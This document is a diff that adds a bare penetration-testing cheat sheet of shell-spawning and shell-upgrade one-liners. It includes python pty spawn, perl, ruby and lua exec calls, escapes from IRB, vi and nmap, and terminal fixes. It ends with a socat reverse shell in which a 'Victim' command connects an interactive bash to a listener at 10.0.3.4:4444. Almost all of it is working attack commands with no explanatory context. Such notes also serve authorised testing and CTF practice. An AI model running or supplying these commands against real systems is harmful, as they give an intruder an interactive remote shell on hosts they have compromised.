@@ -1,0 +1,41 @@
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+echo os.system('/bin/bash')
+
+/bin/sh -i
+
+perl —e 'exec "/bin/sh";'
+
+perl: exec "/bin/sh";
+
+ruby: exec "/bin/sh"
+
+lua: os.execute('/bin/sh')
+
+(From within IRB)
+
+exec "/bin/sh"
+
+(From within vi)
+
+:!bash
+
+(From within vi)
+
+:set shell=/bin/bash:shell
+
+(From within nmap)
+
+!sh
+
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
+
+
+#Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+#Victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
